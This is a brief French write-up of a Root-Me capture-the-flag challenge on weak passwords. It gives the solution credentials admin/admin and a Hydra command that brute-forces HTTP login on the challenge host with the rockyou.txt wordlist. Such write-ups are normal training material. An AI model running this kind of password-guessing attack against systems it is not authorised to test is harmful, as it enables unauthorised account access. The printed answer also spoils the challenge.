Le challenge : https://www.root-me.org/fr/Challenges/Web-Serveur/Mot-de-passe-faible

bon l'admin n'est pas fort en sécurité 
id: admin 
pwd : admin

Il existe un script python pour automatiser ça 

Mais aussi une application appelé hydra avec 
‘‘‘
hydra -l admin -P rockyou.txt -e nrs -vv challenge01.root-me.org http-get /web-serveur/ch3/
‘‘‘
